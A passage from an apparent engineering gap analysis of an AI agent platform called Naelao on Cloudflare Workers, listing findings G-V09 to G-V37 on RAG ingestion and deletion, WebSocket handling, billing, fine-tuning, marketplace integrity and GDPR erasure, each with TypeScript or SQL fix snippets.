The static base instructions, which never change, are not isolated behind a cache breakpoint.

Required Fix

Separate the immutable prefix from the volatile suffix and set an explicit cache breakpoint: ```typescript const messages = [ { role: "system", content: [ // Static base instructions — cached { type: "text", text: BASE_INSTRUCTIONS, providerOptions: { anthropic: { cacheControl: { type: "ephemeral" } } } }, // Volatile memory — placed AFTER the breakpoint so it never invalidates the cache { type: "text", text: assembleMemoryContext(spaceId, userId) }, ], }, ...conversationHistory, ]; ``` Keep skills and tool definitions (also stable) before the breakpoint with base instructions. Only genuinely per-turn content goes after it.

G-V09 HIGH §naelao-knowledge — RAG — naelao-knowledge / deletion

Document deletion removes SQLite metadata but never deletes vectors — search poisoning + GDPR breach

The Gap

When a knowledge document is deleted, its row is removed from SpaceDO SQLite but `vectorize.deleteByIds()` is never called for the document's chunk vectors. The vectors remain in the index permanently, so semantic search continues returning content from documents the user explicitly deleted. This poisons retrieval with stale/removed content and is a direct GDPR Article 17 (right to erasure) violation when the deleted document contained personal data.

Required Fix

Delete vectors as part of document deletion, with retry compensation: ```typescript async deleteDocument(docId: string, spaceId: string) { const chunkIds = [...this.ctx.storage.sql.exec( "SELECT vector_id FROM knowledge_chunks WHERE doc_id = ?", docId )].map(r => r.vector_id); // Delete vectors first; only remove metadata after success await env.NAELAO_VECTORIZE.deleteByIds(chunkIds); this.ctx.storage.sql.exec("DELETE FROM knowledge_chunks WHERE doc_id = ?", docId); this.ctx.storage.sql.exec("DELETE FROM knowledge_docs WHERE id = ?", docId); } ``` Add a nightly reconciliation sweep comparing SQLite chunk IDs against Vectorize to catch any orphans from partial failures.

G-V10 HIGH §naelao-knowledge — RAG — naelao-knowledge / embedding versioning

No embedding model version stored — a model upgrade silently turns all existing vectors into noise

The Gap

Chunks are embedded with `@cf/baai/bge-base-en-v1.5` (768-dim) but neither the chunk metadata nor the Vectorize vectors record which embedding model produced them. If the platform ever upgrades the embedding model, new query vectors live in a different semantic space (and possibly a different dimension) than the existing stored vectors. Cosine similarity between old and new vectors becomes meaningless noise, silently degrading every search with no error raised.

Required Fix

Stamp the embedding model on every vector and gate queries on it: ```typescript const EMBEDDING_MODEL = "@cf/baai/bge-base-en-v1.5"; await env.NAELAO_VECTORIZE.upsert([{ id: chunkId, values: embedding, metadata: { spaceId, docId, embedding_model: EMBEDDING_MODEL }, }]); ``` On model upgrade, run a re-embedding job: query all vectors with the old `embedding_model`, re-embed their source chunks with the new model, upsert, and only then switch query traffic. Provide an admin `/knowledge/reembed` endpoint that drives this as a CF Workflow.

G-V11 MEDIUM §naelao-knowledge — RAG — naelao-knowledge / topK + rerank

topK hardcoded with no re-ranking — relevant chunks ranked just below the cutoff are dropped

The Gap

Knowledge search returns a fixed `topK` (≈20) of raw vector matches and injects them directly into context. For large knowledge bases, a highly relevant chunk can rank 25th by raw cosine similarity and fall below the cutoff, making the agent appear to have amnesia about content that is actually present. There is no cross-encoder re-ranking step to recover relevant-but-lower-ranked chunks, and topK is not configurable per query.

Required Fix

Over-fetch, then re-rank to select the final context set: ```typescript // 1. Over-fetch candidates const candidates = await env.NAELAO_VECTORIZE.query(queryVector, { topK: 50, returnMetadata: "all", filter: { spaceId: { $eq: spaceId } }, }); // 2. Re-rank with a cross-encoder (Workers AI reranker) const reranked = await env.AI.run("@cf/baai/bge-reranker-base", { query: userQuery, contexts: candidates.matches.map(m => ({ text: m.metadata.text })), }); // 3. Inject only the top 5-8 after re-ranking const final = reranked.slice(0, 8); ``` Make the candidate count and final count configurable per space tier.

G-V12 HIGH §naelao-knowledge — RAG — naelao-knowledge / atomicity

Vector upsert and metadata insert are not atomic — partial failure leaves orphaned vectors

The Gap

Ingestion upserts vectors to Vectorize and separately inserts chunk metadata into SpaceDO SQLite. These are two systems with no shared transaction. If the SQLite insert fails after the Vectorize upsert succeeds (DO eviction, CPU limit, error), the vectors exist in the index with no corresponding metadata row — they can be returned by search but can never be deleted (deletion is driven by the metadata table) and are invisible to reconciliation.

Required Fix

Write metadata first, then vectors, and compensate on failure: ```typescript async ingestChunk(chunk: Chunk, embedding: number[]) { const vectorId = crypto.randomUUID(); // 1. Metadata first — establishes the deletion record this.ctx.storage.sql.exec( "INSERT INTO knowledge_chunks (id, doc_id, vector_id, text, status) VALUES (?,?,?,?,'pending')", chunk.id, chunk.docId, vectorId, chunk.text ); try { await env.NAELAO_VECTORIZE.upsert([{ id: vectorId, values: embedding, metadata: { spaceId: chunk.spaceId, docId: chunk.docId } }]); this.ctx.storage.sql.exec("UPDATE knowledge_chunks SET status='active' WHERE id=?", chunk.id); } catch (e) { this.ctx.storage.sql.exec("DELETE FROM knowledge_chunks WHERE id=?", chunk.id); throw e; } } ``` A nightly job deletes any chunk stuck in `pending` for > 1 hour and any Vectorize ID with no `active` row.

G-V13 HIGH §naelao-knowledge — RAG — naelao-knowledge / idempotency

Ingestion is not idempotent — re-uploading the same document creates a duplicate vector set

The Gap

There is no idempotency key or content-hash dedup on ingestion. Uploading the same document twice (a common user action, or an automatic retry after a perceived failure) creates two complete sets of chunk vectors with identical content but different IDs. Search then returns near-duplicate results, wasting context budget and skewing relevance, and the duplicate vectors double the storage and embedding cost.

Required Fix

Key ingestion on a content hash and skip or replace on match: ```typescript async ingestDocument(docId: string, content: ArrayBuffer, spaceId: string) { const contentHash = await sha256(content); const existing = [...this.ctx.storage.sql.exec( "SELECT id, content_hash FROM knowledge_docs WHERE id = ?", docId )][0]; if (existing?.content_hash === contentHash) { return { skipped: true, reason: "unchanged" }; } if (existing) { // Content changed — delete old chunks/vectors before re-ingesting (see G-V09) await this.deleteDocument(docId, spaceId); } // ... chunk, embed, upsert, store content_hash } ```

G-V14 MEDIUM §naelao-knowledge — RAG — naelao-knowledge / chunking

Naive whitespace chunking splits mid-sentence and counts words, not tokens

The Gap

The chunker splits text on `\s+` to roughly 512 "tokens" by word count, with a 50-"token" overlap also measured in words. Word count is a poor proxy for token count (code and non-English text tokenize very differently), so chunks routinely overshoot or undershoot the model's expected window. Worse, splitting on raw whitespace cuts through the middle of sentences and code blocks, destroying the semantic cohesion that makes a chunk independently retrievable.

Required Fix

Chunk on semantic boundaries with a real tokenizer: ```typescript import { encode } from "gpt-tokenizer"; // or a bge-compatible tokenizer function chunkText(text: string, targetTokens = 512, overlapTokens = 64): string[] { // Split into sentences/paragraphs first const units = text.split(/(?<=[.!?])\s+|\n\n+/); const chunks: string[] = []; let buf: string[] = [], bufTokens = 0; for (const unit of units) { const t = encode(unit).length; if (bufTokens + t > targetTokens && buf.length) { chunks.push(buf.join(" ")); // carry overlap by tokens, not words buf = carryOverlap(buf, overlapTokens); bufTokens = encode(buf.join(" ")).length; } buf.push(unit); bufTokens += t; } if (buf.length) chunks.push(buf.join(" ")); return chunks; } ```

G-V15 MEDIUM §naelao-knowledge — RAG — naelao-knowledge / parse failures

PDF/DOCX parse failures have no error path — documents silently ingest with zero vectors

The Gap

Ingestion calls `extractPdfText()` and `extractDocxText()` but specifies no failure handling. A corrupt PDF, a password-protected file, or an unsupported DOCX variant causes extraction to return empty or throw. The spec does not define whether the upload fails, whether a `knowledge_docs` row is created with no chunks, or whether the user is told. The likely outcome is a document that appears successfully uploaded in the UI but contributes nothing to search — a silent data-loss failure.

Required Fix

Make parse failures explicit and never create a doc record without content: ```typescript async function parseDocument(buffer: ArrayBuffer, mime: string): Promise<string> { let text: string; try { if (mime === "application/pdf") text = await extractPdfText(buffer, env); else if (mime.includes("wordprocessingml")) text = await extractDocxText(buffer); else throw new UnsupportedFormat(mime); } catch (e) { throw new ParseError(`Failed to parse ${mime}: ${e.message}`); } if (!text || text.trim().length < 10) { throw new ParseError("Document produced no extractable text (scanned image? empty file?)"); } return text; } // Caller returns HTTP 422 with the reason; no knowledge_docs row is written on failure. ``` For scanned PDFs, offer an OCR fallback (Workers AI image-to-text) before failing.

G-V16 MEDIUM §naelao-knowledge — RAG — naelao-knowledge / embedding limits + billing

Embedding batch limits unhandled and embedding token cost is never billed

The Gap

Ingestion batches chunks in groups of 100 (the Vectorize upsert limit) and calls Workers AI embedding per batch, but Workers AI embedding has its own batch and rate limits that are neither documented nor handled — an oversized batch can fail or be silently truncated. Separately, embedding consumes real tokens (a 5MB document is ~1M embedding tokens) and the spec never records embedding token usage against billing, so this cost is entirely unaccounted.

Required Fix

Bound embedding batches independently, handle 413/429, and bill embedding tokens: ```typescript const EMBED_BATCH = 25; // conservative for Workers AI embedding let embeddingTokens = 0; for (let i = 0; i < chunks.length; i += EMBED_BATCH) { const batch = chunks.slice(i, i + EMBED_BATCH); const res = await withBackoff(() => env.AI.run("@cf/baai/bge-base-en-v1.5", { text: batch.map(c => c.text) })); embeddingTokens += batch.reduce((n, c) => n + estimateTokens(c.text), 0); // upsert in Vectorize-sized sub-batches of 100 } await env.NAELAO_BILLING_QUEUE.send({ type: "embedding_usage", spaceId, tokens: embeddingTokens, costMicroCents: BigInt(embeddingTokens) * EMBED_PRICE_MICRO_CENTS, }); ```

G-V17 CRITICAL §Frontend — WebSocket — client / DO hibernation

handleWebSocketUpgrade never calls acceptWebSocket — hibernation drops messages, reconnect replay broken

The Gap

The WebSocket upgrade handler creates a `WebSocketPair` and returns the client socket but never calls `this.ctx.acceptWebSocket(server, tags)`. Without the hibernation-API accept call, the DO holds the socket only in memory: when the DO hibernates (which it will, aggressively), the socket is dropped and any messages the client sends afterward are never routed to `webSocketMessage()`. This silently breaks long-lived chat sessions and makes the reconnect-replay path unreachable, because the server side of the connection no longer exists after the first hibernation.

Required Fix

Use the hibernation WebSocket API so sockets survive eviction: ```typescript async handleWebSocketUpgrade(request: Request): Promise<Response> { const pair = new WebSocketPair(); const [client, server] = Object.values(pair); // Accept with the hibernation API — REQUIRED for messages to route post-hibernation this.ctx.acceptWebSocket(server, [`space:${spaceId}`, `user:${userId}`]); return new Response(null, { status: 101, webSocket: client }); } // Implement the hibernation handlers (not in-memory addEventListener): async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) { /* ... */ } async webSocketClose(ws: WebSocket, code: number, reason: string) { /* ... */ } ```

G-V18 HIGH §Frontend — WebSocket — client / message parsing

webSocketMessage parses JSON with no try/catch — a malformed frame evicts the DO mid-run

The Gap

The `webSocketMessage` handler calls `JSON.parse(message)` directly with no error handling. A binary frame, a truncated message from a flaky connection, or a malicious client sending non-JSON throws an uncaught exception inside the DO. An uncaught throw in a DO handler can tear down the DO, taking any in-flight agent turn with it. A single bad frame from one client thus aborts that user's running agent.

Required Fix

Guard parsing and handle non-JSON frames gracefully: ```typescript async webSocketMessage(ws: WebSocket, message: string | ArrayBuffer) { if (typeof message !== "string") { ws.send(JSON.stringify({ type: "error", message: "binary frames not supported" })); return; } let parsed: ClientMessage; try { parsed = JSON.parse(message); } catch { ws.send(JSON.stringify({ type: "error", message: "invalid JSON" })); return; } try { await this.handleClientMessage(ws, parsed); } catch (e) { ws.send(JSON.stringify({ type: "error", message: "internal error" })); // swallow — never let a single message crash the DO } } ```

G-V19 HIGH §Frontend — Streaming — client / disconnect billing

Token usage is billed only when the final SSE chunk reaches the client — disconnect = free inference

The Gap

Token accounting is performed when the terminal stream chunk (carrying usage totals) is delivered to the client. If the user disconnects before that chunk arrives — browser close, network drop, or deliberately — the usage is never recorded and the tokens consumed from the upstream model are never debited from the wallet. A user can obtain unlimited free inference simply by closing the connection just before completion. Billing must be tied to server-side completion, not client delivery.

Required Fix

Bill server-side on completion, independent of client delivery: ```typescript // In the agent loop, on stream finish (server-side event, always fires) onStepFinish: async ({ usage }) => { this.accumulatedUsage.input += usage.promptTokens; this.accumulatedUsage.output += usage.completionTokens; }, // And in onChatEnd / onChatError (see G-V06) — always flush, even if client gone async onChatEnd() { await env.NAELAO_BILLING_QUEUE.send({ type: "token_usage", spaceId, userId, costMicroCents: calculateCostMicroCents(this.accumulatedUsage.input, this.accumulatedUsage.output), }); } ``` The client receiving the usage chunk becomes a display concern only; billing no longer depends on it.

G-V20 MEDIUM §Frontend — Streaming — client / token buffer growth

Stream replay buffer grows unbounded — long runs create 100MB+ of rows and slow reconnects

The Gap

Every streamed token inserts a row into the replay buffer with no `LIMIT`, TTL, or cleanup. A long-running agent emitting 2M tokens creates 2M rows (~100MB) in the DO's SQLite. On reconnect, replay reads the entire buffer at once, causing multi-second reconnection stalls and blocking the agent loop while the read completes. The buffer is also never trimmed after the turn ends.

Required Fix

Bound the buffer to the current turn and trim aggressively: ```typescript // Trim old turns when a new turn starts async startTurn(turnId: string) { this.currentTurnId = turnId; // Keep only the current turn's buffer this.ctx.storage.sql.exec("DELETE FROM stream_buffer WHERE turn_id != ?", turnId); } // On reconnect, replay only events after the client's last-seen seq (see G-V03), // and cap the replay to the most recent N events: const tail = [...this.ctx.storage.sql.exec( "SELECT event_json FROM stream_buffer WHERE turn_id=? AND seq>? ORDER BY seq DESC LIMIT 2000", turnId, lastSeq )].reverse(); ``` For very long outputs, checkpoint completed text to the messages table and clear the per-token buffer.

G-V21 MEDIUM §Frontend — API — client / pagination cursor

Pagination cursors on created_at collide on same-millisecond inserts — page 2 silently skips messages

The Gap

Thread pagination uses `WHERE created_at > ?` with `created_at` as the cursor. Multiple messages inserted in the same millisecond (common during multi-agent runs where several tool results land together) share an identical `created_at`. When the cursor lands on that timestamp, the next page's `> ?` filter skips ALL messages with that exact timestamp, silently dropping them from the UI. Users see gaps in their conversation that do not correspond to any deletion.

Required Fix

Use a compound, strictly-monotonic cursor (timestamp + tiebreaker id): ```sql -- Cursor encodes both created_at and id SELECT * FROM messages WHERE space_id = ? AND (created_at, id) > (?, ?) -- compound comparison, no collisions ORDER BY created_at ASC, id ASC LIMIT ?; ``` ```typescript // Cursor = base64({ createdAt, id }) of the last row on the previous page const cursor = { createdAt: lastRow.created_at, id: lastRow.id }; ``` Alternatively use a monotonic auto-increment `seq` column as the sole cursor — guaranteed unique and ordered.

G-V22 CRITICAL §Finetune — Pipeline — FinetuneJobDO / SpaceDO wiring

Fine-tune jobs submitted to Together AI but never tracked locally — sweeper polls a 404 endpoint

The Gap

The fine-tune worker successfully submits jobs to Together AI, then calls a SpaceDO endpoint (`/finetune/*`) to record the job — but SpaceDO has no `finetune_jobs` table and no such route, so the call returns 404 and the job is never tracked locally. The sweeper's `sweepStaleFineTuneJobs()` queries the same missing endpoint and also 404s. The result: jobs run and bill on Together AI with zero local visibility, no status updates, no completion handling, and no way to surface results to the user.

Required Fix

Add the table and route to SpaceDO and wire the worker to it: ```sql CREATE TABLE IF NOT EXISTS finetune_jobs ( id TEXT PRIMARY KEY, space_id TEXT NOT NULL, provider_job_id TEXT, status TEXT NOT NULL DEFAULT 'queued' CHECK (status IN ('queued','running','completed','failed','cancelled')), error_message TEXT, result_model TEXT, cost_micro_cents INTEGER DEFAULT 0, created_at INTEGER DEFAULT (unixepoch('now')*1000), updated_at INTEGER ); ``` ```typescript // SpaceDO route case "/finetune/create": { /* INSERT row, return job */ } case "/finetune/update": { /* UPDATE status/result by provider_job_id */ } case "/finetune/stale": { /* SELECT running jobs older than N for the sweeper */ } ```

G-V23 HIGH §Finetune — Pipeline — FinetuneJobDO / alarm idempotency

Polling alarm fires at-least-once with no idempotency guard — duplicate completion notifications

The Gap

CF Durable Object alarms guarantee at-least-once delivery; an alarm handler can fire more than once for the same scheduled time (e.g., after a timeout-and-retry). The fine-tune polling `alarm()` sends a completion notification and updates downstream state each time it observes a finished job. Without a guard, a double-fire sends the user two "training complete" notifications and may re-trigger any completion side-effects (model registration, billing settlement).

Required Fix

Guard the alarm with a last-handled marker and make completion handling idempotent: ```typescript async alarm() { const lastAt = (await this.ctx.storage.get<number>("alarm_handled_at")) ?? 0; if (Date.now() - lastAt < 5000) return; // collapse duplicate fires await this.ctx.storage.put("alarm_handled_at", Date.now()); const status = await pollProvider(this.providerJobId); if (status === "completed" && !(await this.ctx.storage.get("completion_handled"))) { await this.ctx.storage.put("completion_handled", true); await notifyUser(this.spaceId, "finetune_complete"); await settleBilling(this.jobId); return; // do not reschedule } await this.ctx.storage.setAlarm(Date.now() + this.pollInterval); } ```

G-V24 HIGH §Finetune — Pipeline — FinetuneJobDO / budget + concurrency

No concurrent-job cap or pre-submission budget check — a user can exhaust the space budget with parallel jobs

The Gap

The fine-tune handler validates dataset format and a 50-example minimum but never checks how many jobs the space already has running, nor reserves credits before submission, nor estimates cost up front. A user (or a buggy client retry loop) can start dozens of long-running training jobs in parallel; each bills on Together AI for hours, and the space's monthly budget is blown to thousands of dollars before anyone notices, because the only billing signal arrives at job completion.

Required Fix

Enforce a concurrency limit and reserve estimated cost before submitting: ```typescript async createFinetuneJob(spaceId: string, dataset: Dataset) { const MAX_CONCURRENT = 3; const running = await spaceDO.countRunningFinetuneJobs(spaceId); if (running >= MAX_CONCURRENT) { throw new Error(`Concurrent fine-tune limit (${MAX_CONCURRENT}) reached`); } const estCents = estimateFinetuneCostCents(dataset); const reservation = await walletDO.reserveCredits(estCents); // throws if insufficient try { const providerJobId = await submitToProvider(dataset); await spaceDO.createFinetuneJob({ spaceId, providerJobId, reservation }); } catch (e) { await walletDO.releaseReservation(reservation); throw e; } } ```

G-V25 MEDIUM §Finetune — Pipeline — FinetuneJobDO / dataset validation

Dataset validation checks format and count only — no size, sequence-length, or schema-consistency checks

The Gap

Validation confirms JSONL format and a 50-example minimum but does not check: maximum file size, maximum sequence length per example (examples exceeding the model's context are rejected by the provider mid-job), per-example token counts, or schema consistency across examples (some examples missing the `assistant` turn). A dataset that passes Naelao's validation can still fail partway through training on Together AI, wasting the reserved budget and the user's time with a cryptic provider error.

Required Fix

Add comprehensive pre-submission validation: ```typescript function validateDataset(lines: string[]): ValidationResult { const errors: string[] = []; if (lines.length < 50) errors.push("min 50 examples"); if (lines.length > 100_000) errors.push("max 100k examples"); let totalBytes = 0; for (const [i, line] of lines.entries()) { const ex = JSON.parse(line); if (!ex.messages?.some(m => m.role === "assistant")) errors.push(`example ${i}: missing assistant turn`); const tokens = estimateTokens(JSON.stringify(ex)); if (tokens > MAX_SEQ_LEN) errors.push(`example ${i}: ${tokens} tokens > ${MAX_SEQ_LEN}`); totalBytes += line.length; } if (totalBytes > 500 * 1024 * 1024) errors.push("dataset > 500MB"); return { valid: errors.length === 0, errors }; } ```

G-V26 HIGH §MiniAGI — Federated — MiniAGIDO / result merging

Federated query concatenates domain results with no dedup or conflict resolution

The Gap

MiniAGIDO's `query()` fetches matching records from each granted data domain in R2 and concatenates them into a single LLM prompt. The same record present in two domains (e.g., order #123 in both "sales" and "customer" domains) appears twice, wasting context and biasing the model toward duplicated facts. When two domains hold conflicting values for the same entity (domain A: price=$100, domain B: price=$150), both are injected with no resolution strategy, leaving the model to guess which is authoritative.

Required Fix

Deduplicate by record key and resolve conflicts before injection: ```typescript function mergeDomainResults(results: DomainRecord[][]): MergedRecord[] { const byKey = new Map<string, MergedRecord>(); for (const domainResults of results) { for (const rec of domainResults) { const existing = byKey.get(rec.id); if (!existing) { byKey.set(rec.id, { ...rec, sources: [rec.domain] }); continue; } // Conflict: keep higher-trust domain, record the discrepancy existing.sources.push(rec.domain); if (DOMAIN_TRUST[rec.domain] > DOMAIN_TRUST[existing.domain]) { byKey.set(rec.id, { ...rec, sources: existing.sources, conflicts: existing }); } } } return [...byKey.values()]; } ``` Surface conflicts to the model explicitly (`<conflict>` markers) so it can flag uncertainty rather than silently picking one.

G-V27 MEDIUM §MiniAGI — Federated — MiniAGIDO / result size

Federated fetch has no size cap — a large domain overflows the prompt and OOMs the DO

The Gap

`fetchDomainData()` pulls all matching records from a granted domain with no pagination, streaming, or size cap. A domain backed by a 1M-row CSV loads entirely into the DO's memory and is injected into a single LLM prompt, exceeding both the DO memory budget and the model's context window. There is no cursor-based fetch and no early termination once enough relevant context is gathered.

Required Fix

Cap fetched data and use relevance-bounded retrieval instead of full scans: ```typescript async function fetchDomainData(domain: string, query: string, env: Env) { const MAX_RECORDS = 200; const MAX_BYTES = 256 * 1024; // Prefer a vector/index lookup scoped to the domain over a full scan const hits = await env.NAELAO_VECTORIZE.query(await embed(query, env), { topK: MAX_RECORDS, filter: { domain: { $eq: domain }, spaceId: { $eq: spaceId } }, }); let bytes = 0; const records = []; for (const h of hits.matches) { const r = await loadRecord(h.id, env); bytes += JSON.stringify(r).length; if (bytes > MAX_BYTES) break; records.push(r); } return records; } ```

G-V28 MEDIUM §Finetune — Pipeline — FinetuneJobDO / observability columns

finetune_jobs schema lacks error, metrics, ETA, and cost columns — failures are opaque

The Gap

The job table tracks only `status` with no `CHECK` constraint and is missing the columns needed to operate the pipeline: `error_message` (why did it fail?), `attempt_count` (retry tracking), `metrics` (final training loss/accuracy), `estimated_completion_at` (ETA for the UI), and `cost_usd`/`cost_micro_cents` (actual billed cost). When a job fails, the user sees "failed" with no reason; support cannot diagnose without provider-side logs.

Required Fix

Extend the schema with observability and integrity fields: ```sql ALTER TABLE finetune_jobs ADD COLUMN error_message TEXT; ALTER TABLE finetune_jobs ADD COLUMN attempt_count INTEGER DEFAULT 0; ALTER TABLE finetune_jobs ADD COLUMN metrics TEXT; -- JSON: { loss, accuracy } ALTER TABLE finetune_jobs ADD COLUMN estimated_completion_at INTEGER; ALTER TABLE finetune_jobs ADD COLUMN cost_micro_cents INTEGER DEFAULT 0; -- And enforce valid states (recreate with CHECK if not present): -- status CHECK (status IN ('queued','running','completed','failed','cancelled')) ``` Populate `metrics` and `cost_micro_cents` from the provider's completion payload; surface `error_message` in the UI on failure.

G-V29 HIGH §Marketplace — Versioning — AppRegistryDO / definition upgrades

Marketplace agent definitions auto-upgrade with no version pinning — breaking changes hit live installs

The Gap

Agent/worker definitions installed from the marketplace auto-upgrade to the publisher's latest version with no version pinning and no notification. A publisher pushing a v2 with an incompatible system prompt, changed tool contract, or renamed parameters silently breaks every existing installation — including production deployments — with no rollback path and no record of what changed.

Required Fix

Implement semantic versioning with install-time pinning and opt-in major upgrades: ```typescript // Store the resolved version at install time async installDefinition(defId: string, spaceId: string) { const latest = await registry.getLatest(defId); await spaceDO.recordInstall({ defId, spaceId, pinnedVersion: latest.version, // pin exact version snapshot: latest, // immutable snapshot autoUpgrade: "minor", // minor/patch auto, major opt-in }); } // On publisher update: // - patch/minor matching the install's policy: auto-apply, log to audit // - major: create a pending upgrade the installer must approve ``` Log every applied upgrade to the space audit trail with a diff summary.

G-V30 HIGH §Marketplace — Isolation — AppRegistryDO / search scope

Marketplace search indexes definitions without visibility scoping — private definitions leak across spaces

The Gap

Agent definitions published to the marketplace are indexed for search without a visibility/scope tag. A search query returns definitions from all spaces, so space-private or internal-only agent definitions (which may embed proprietary prompts, internal tool wiring, or business logic) become discoverable by users in other tenants. There is no enforced filter separating public-listed definitions from space-private ones.

Required Fix

Tag every definition with a visibility level and enforce it in search: ```typescript // On publish await registry.index({ defId, spaceId, visibility: input.visibility, // 'public' | 'unlisted' | 'space-private' }); // On search — never return another space's private definitions async searchDefinitions(query: string, requestingSpaceId: string) { return registry.search(query, { filter: { $or: [ { visibility: { $eq: "public" } }, { visibility: { $eq: "space-private" }, spaceId: { $eq: requestingSpaceId } }, ], }, }); } ```

G-V31 MEDIUM §Marketplace — Payouts — WorkerDefinitionDO / KYC

Worker payouts default to held with no KYC pipeline — creator revenue is stranded indefinitely

The Gap

The WorkerDefinitionDO schema sets `payoutStatus = "held"` until identity is verified, but the spec provides no identity-verification process. A creator publishes a worker, accrues revenue, and the payout remains "held" forever with no escalation path, no integration with a verification provider, and no notification telling the creator how to unblock it. Revenue accumulates that can never be disbursed.

Required Fix

Add an async KYC workflow with a clear unblock path: ```typescript // On first accrued payout, trigger verification if not yet verified if (worker.payoutStatus === "held" && !worker.kycStatus) { await spaceDO.setKycStatus(creatorId, "pending"); // Integrate a verification provider (e.g., Stripe Identity) const session = await createVerificationSession(creatorId); await notifyCreator(creatorId, { type: "kyc_required", actionUrl: session.url, message: "Verify your identity to receive payouts.", }); } // On verification webhook success: payoutStatus -> 'eligible', release held balance ``` Define a maximum hold duration after which held funds are flagged for manual review.

G-V32 MEDIUM §Marketplace — Lifecycle — WorkerDefinitionDO / deprecation

Deprecating a worker does not notify active instances — dependent runs break with no grace period

The Gap

The schema includes a `deprecated` status but no notification mechanism or grace period for the WorkerInstanceDOs already hiring that worker. When a creator deprecates v1 and the replacement is incompatible, active company instances silently stop working with no advance warning, no version lock to stay on the deprecated version, and no migration guidance.

Required Fix

Add deprecation timestamps, notifications, and version locking: ```typescript async deprecateWorker(workerId: string, eolDays = 30) { const eol = Date.now() + eolDays * 86400_000; this.ctx.storage.sql.exec( "UPDATE workers SET status='deprecated', deprecated_at=?, end_of_life_at=? WHERE id=?", Date.now(), eol, workerId ); // Notify all active hirers const hirers = await getActiveHirers(workerId); for (const h of hirers) { await notify(h.spaceId, { type: "worker_deprecated", workerId, eol, message: `Worker EOL in ${eolDays} days. Lock version or migrate.` }); } } // Allow instances to pin: WorkerInstanceDO.lockVersion() stops further syncs. ```

G-V33 MEDIUM §Marketplace — Integrity — AppRegistryDO / ratings + quota

Publishers can rate their own assets and publish unlimited agents — Sybil-able ratings and marketplace spam

The Gap

The marketplace lets publishers rate their own apps/workers and imposes no publish quota. A creator can spin up fake spaces and 5-star their own worker repeatedly to manipulate ranking (a Sybil attack), and can publish thousands of near-duplicate spam agents that clutter search and consume storage. Neither rating provenance nor publish volume is constrained.

Required Fix

Constrain rating provenance and cap publishing: ```typescript // Reject self-ratings and require an actual install/usage to rate async rateAsset(assetId: string, raterUserId: string, stars: number) { const asset = await registry.get(assetId); if (asset.publisherUserId === raterUserId) throw new Error("publishers cannot rate their own assets"); if (!(await hasUsed(raterUserId, assetId))) throw new Error("must use the asset before rating"); // one rating per user per asset (UNIQUE constraint) } // Publish quota per user/tier const PUBLISH_QUOTA = { free: 5, pro: 50, enterprise: 500 }; if (publishedCount >= PUBLISH_QUOTA[tier]) throw new Error("publish quota reached"); ``` Deindex assets with zero installs after 90 days to keep search clean.

G-V34 CRITICAL §Compliance — GDPR — platform / right-to-erasure

User deletion only soft-deletes SpaceDO — no cross-system erasure across R2, Vectorize, Analytics, KV, AI cache

The Gap

User data lives in at least six systems: SpaceDO/AssistantDO SQLite, R2 (files, skills, workspace), Vectorize (memory and knowledge vectors), Analytics Engine (events), KV (caches), and the AI Gateway response cache. A right-to-deletion request only soft-deletes the SpaceDO row. The personal data in R2, Vectorize, Analytics Engine, and caches remains, which is a direct GDPR Article 17 violation. Analytics Engine in particular cannot delete individual rows at all, so it needs a distinct strategy (avoid storing PII, or pseudonymize).

Required Fix

Implement an erasure saga as a CF Workflow that fans out across every store: ```typescript export class ErasureWorkflow extends WorkflowEntrypoint { async run(event, step) { const { userId, spaceId } = event.payload; await step.do("purge-do-sqlite", () => purgeUserRows(userId, spaceId)); await step.do("purge-r2", () => deleteR2Prefix(`spaces/${spaceId}/assistants/${userId}/`)); await step.do("purge-vectorize", async () => { const v = await env.NAELAO_VECTORIZE.query([0], { topK: 1000, filter: { spaceId: { $eq: spaceId }, userId: { $eq: userId } } }); await env.NAELAO_VECTORIZE.deleteByIds(v.matches.map(m => m.id)); }); await step.do("purge-kv", () => deleteUserKVKeys(userId)); await step.do("emit-erasure-certificate", () => recordErasure(userId, Date.now())); } } ``` For Analytics Engine: never write raw PII; store a salted user hash that can be disassociated, and document the 90-day rolling window after which events age out.

G-V35 HIGH §Observability — Analytics — Analytics Engine / positional schema

Analytics Engine fields are positional with no schema registry — inserting a field corrupts every existing query

The Gap

Analytics Engine data points are positional: `blobs[0..19]` and `doubles[0..19]`. Naelao writes data points across many call sites with hand-maintained field ordering. Adding a new field in the middle (or a developer guessing the wrong index) silently shifts every subsequent field, so existing dashboards and queries that read `blobs[3]` now read different data with no error. There is no central schema registry mapping field names to indices.

Required Fix

Centralize the field schema and write through a typed helper: ```typescript // Single source of truth for field positions const ANALYTICS_SCHEMA = { blobs: { eventType: 0, spaceId: 1, userId: 2, component: 3, detail: 4 }, doubles: { count: 0, latencyMs: 1, tokens: 2, costMicroCents: 3 }, index1: "eventType", } as const; function writeAnalytics(env: Env, event: TypedAnalyticsEvent) { const blobs = new Array(20).fill(""); const doubles = new Array(20).fill(0); blobs[ANALYTICS_SCHEMA.blobs.eventType] = event.eventType; blobs[ANALYTICS_SCHEMA.blobs.spaceId] = event.spaceId; doubles[ANALYTICS_SCHEMA.doubles.tokens] = event.tokens ?? 0; env.NAELAO_ANALYTICS.writeDataPoint({ blobs, doubles, indexes: [event.eventType] }); } ``` New fields only ever append at the next free index; never reorder. Version the schema and document each index.

G-V36 HIGH §Observability — Tracing — platform / trace context

22 Workers with zero W3C trace-context propagation — cross-Worker requests cannot be correlated

The Gap

Naelao spans ~22 Workers plus many Durable Objects, communicating via Service Bindings, queues, and HTTP. No `traceparent` (W3C Trace Context) header is propagated across these boundaries. When a request fans out (router → agent → tool → MCP hub → billing queue), there is no correlation ID linking the spans, so debugging a slow or failed request across Workers is impossible — each Worker's logs are an isolated island.

Required Fix

Generate a trace ID at the edge and propagate it through every hop: ```typescript // At naelao-router (edge): create or accept a traceparent const traceId = request.headers.get("traceparent") ?? crypto.randomUUID().replace(/-/g, ""); // Propagate on every downstream call await env.NAELAO_AGENTS.fetch(new Request(url, { headers: { ...headers, "traceparent": `00-${traceId}-${spanId}-01` }, })); // On queue sends, include it in the message body await env.NAELAO_BILLING_QUEUE.send({ ...payload, traceId }); // Every log line and Analytics Engine event includes traceId in a fixed blob slot ``` Forward all logs to a Tail Worker that indexes by `traceId` for end-to-end request reconstruction.

G-V37 MEDIUM §Compliance — Retention — platform / data retention

No automatic retention or expiry policy — messages, runs, and logs grow unbounded toward the 1GB DO limit

The Gap

